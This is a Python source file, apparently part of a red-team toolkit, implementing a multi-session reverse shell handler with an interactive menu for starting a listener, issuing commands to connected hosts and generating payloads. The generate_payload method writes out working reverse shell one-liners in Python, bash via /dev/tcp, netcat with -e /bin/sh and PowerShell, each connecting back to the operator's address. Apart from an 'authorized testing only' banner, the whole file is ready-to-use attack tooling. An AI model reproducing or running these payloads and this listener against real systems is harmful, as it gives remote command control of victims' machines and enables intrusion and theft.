#!/usr/bin/env python3
"""
Red Team Tools - Reverse Shell Handler
Multi-session reverse shell listener
For authorized security testing only
"""

import sys
import os
import socket
import threading
import time
import select
from typing import Dict, Optional

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils import *


class ReverseShellHandler:
    """Multi-session reverse shell handler"""
    
    def __init__(self, host: str = "0.0.0.0", port: int = 4444):
        self.host = host
        self.port = port
        self.server_socket: Optional[socket.socket] = None
        self.sessions: Dict[int, Dict] = {}
        self.session_counter = 0
        self.running = False
        self.active_session: Optional[int] = None
    
    def start_listener(self) -> bool:
        """Start the listening server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            
            success(f"Listening on {self.host}:{self.port}")
            
            # Start accept thread
            accept_thread = threading.Thread(target=self._accept_connections, daemon=True)
            accept_thread.start()
            
            return True
        except Exception as e:
            error(f"Failed to start listener: {e}")
            return False
    
    def _accept_connections(self):
        """Accept incoming connections"""
        while self.running:
            try:
                self.server_socket.settimeout(1.0)
                try:
                    client_socket, addr = self.server_socket.accept()
                    
                    self.session_counter += 1
                    session_id = self.session_counter
                    
                    self.sessions[session_id] = {
                        "socket": client_socket,
                        "address": addr,
                        "connected_at": time.strftime("%Y-%m-%d %H:%M:%S"),
                        "active": True
                    }
                    
                    success(f"\n[+] New session {session_id} from {addr[0]}:{addr[1]}")
                    print(f"\n{C}[?]{RESET} ", end="", flush=True)
                    
                except socket.timeout:
                    continue
            except:
                break
    
    def stop_listener(self):
        """Stop the listener"""
        self.running = False
        
        # Close all sessions
        for session_id in list(self.sessions.keys()):
            self.close_session(session_id)
        
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        info("Listener stopped")
    
    def list_sessions(self):
        """List all active sessions"""
        if not self.sessions:
            warning("No active sessions")
            return
        
        print(f"\n{C}{BRIGHT}Active Sessions{RESET}")
        print(f"{C}{'─' * 50}{RESET}")
        
        for sid, session in self.sessions.items():
            addr = session["address"]
            status = f"{G}Active{RESET}" if session["active"] else f"{R}Closed{RESET}"
            print(f"  [{Y}{sid}{RESET}] {addr[0]}:{addr[1]} - {status} ({session['connected_at']})")
    
    def interact(self, session_id: int):
        """Interact with a session"""
        if session_id not in self.sessions:
            error("Session not found")
            return
        
        session = self.sessions[session_id]
        if not session["active"]:
            error("Session is closed")
            return
        
        sock = session["socket"]
        addr = session["address"]
        
        print(f"\n{G}[*] Interacting with session {session_id} ({addr[0]}:{addr[1]}){RESET}")
        print(f"{Y}[*] Type 'background' to return to handler{RESET}\n")
        
        self.active_session = session_id
        
        try:
            while session["active"]:
                # Check if there's data to read
                readable, _, _ = select.select([sock], [], [], 0.1)
                
                if readable:
                    try:
                        data = sock.recv(4096)
                        if not data:
                            warning("Connection closed by remote host")
                            session["active"] = False
                            break
                        print(data.decode(errors='ignore'), end="", flush=True)
                    except:
                        session["active"] = False
                        break
                
                # Check for user input (non-blocking)
                try:
                    import msvcrt
                    if msvcrt.kbhit():
                        cmd = input()
                        if cmd.lower() == "background":
                            info("Backgrounding session...")
                            break
                        sock.send((cmd + "\n").encode())
                except ImportError:
                    # Linux/Mac
                    import sys
                    import select as sel
                    if sel.select([sys.stdin], [], [], 0.1)[0]:
                        cmd = sys.stdin.readline().strip()
                        if cmd.lower() == "background":
                            info("Backgrounding session...")
                            break
                        sock.send((cmd + "\n").encode())
        
        except KeyboardInterrupt:
            info("\nBackgrounding session...")
        except Exception as e:
            error(f"Error: {e}")
        
        self.active_session = None
    
    def send_command(self, session_id: int, command: str) -> Optional[str]:
        """Send command and get response"""
        if session_id not in self.sessions:
            return None
        
        session = self.sessions[session_id]
        if not session["active"]:
            return None
        
        sock = session["socket"]
        
        try:
            sock.send((command + "\n").encode())
            time.sleep(0.5)
            
            response = b""
            sock.setblocking(False)
            
            while True:
                try:
                    data = sock.recv(4096)
                    if data:
                        response += data
                    else:
                        break
                except:
                    break
            
            sock.setblocking(True)
            return response.decode(errors='ignore')
        except:
            return None
    
    def close_session(self, session_id: int):
        """Close a specific session"""
        if session_id not in self.sessions:
            return
        
        session = self.sessions[session_id]
        try:
            session["socket"].close()
        except:
            pass
        session["active"] = False
        info(f"Session {session_id} closed")
    
    def generate_payload(self, payload_type: str = "python") -> str:
        """Generate reverse shell payload"""
        import socket
        local_ip = socket.gethostbyname(socket.gethostname())
        
        payloads = {
            "python": f'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{local_ip}",{self.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'''',
            
            "bash": f'''bash -i >& /dev/tcp/{local_ip}/{self.port} 0>&1''',
            
            "nc": f'''nc -e /bin/sh {local_ip} {self.port}''',
            
            "powershell": f'''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{local_ip}',{self.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"''',
        }
        
        return payloads.get(payload_type, payloads["python"])


def interactive_mode():
    """Interactive reverse shell handler"""
    clear_screen()
    print_banner("SHELL HANDLER", font="small", color="red")
    
    print(f"{R}{'═' * 50}{RESET}")
    print(f"{Y}⚠  AUTHORIZED TESTING ONLY{RESET}")
    print(f"{R}{'═' * 50}{RESET}\n")
    
    handler = None
    
    while True:
        print(f"\n{C}OPTIONS{RESET}")
        print(f"  {Y}[1]{RESET} Start Listener")
        print(f"  {Y}[2]{RESET} List Sessions")
        print(f"  {Y}[3]{RESET} Interact with Session")
        print(f"  {Y}[4]{RESET} Generate Payload")
        print(f"  {Y}[5]{RESET} Close Session")
        print(f"  {Y}[6]{RESET} Stop Listener")
        print(f"  {R}[0]{RESET} Back")
        
        choice = prompt("Select").strip()
        
        if choice == "0":
            if handler:
                handler.stop_listener()
            break
        
        elif choice == "1":
            host = prompt("Listen host [0.0.0.0]").strip() or "0.0.0.0"
            port = int(prompt("Listen port [4444]").strip() or "4444")
            
            handler = ReverseShellHandler(host, port)
            handler.start_listener()
        
        elif choice == "2":
            if handler:
                handler.list_sessions()
            else:
                warning("Listener not started")
        
        elif choice == "3":
            if not handler:
                warning("Listener not started")
                continue
            
            handler.list_sessions()
            session_id = int(prompt("Session ID").strip() or "0")
            handler.interact(session_id)
        
        elif choice == "4":
            port = int(prompt("Listener port [4444]").strip() or "4444")
            temp_handler = ReverseShellHandler(port=port)
            
            print(f"\n{Y}Payload Types:{RESET}")
            print("  [1] Python")
            print("  [2] Bash")
            print("  [3] Netcat")
            print("  [4] PowerShell")
            
            ptype = prompt("Select").strip()
            types = {"1": "python", "2": "bash", "3": "nc", "4": "powershell"}
            
            payload = temp_handler.generate_payload(types.get(ptype, "python"))
            print(f"\n{G}Payload:{RESET}")
            print(payload)
        
        elif choice == "5":
            if handler:
                handler.list_sessions()
                session_id = int(prompt("Session ID to close").strip() or "0")
                handler.close_session(session_id)
            else:
                warning("Listener not started")
        
        elif choice == "6":
            if handler:
                handler.stop_listener()
                handler = None
            else:
                warning("Listener not started")
    
    input(f"\n{C}Press Enter...{RESET}")


if __name__ == "__main__":
    interactive_mode()
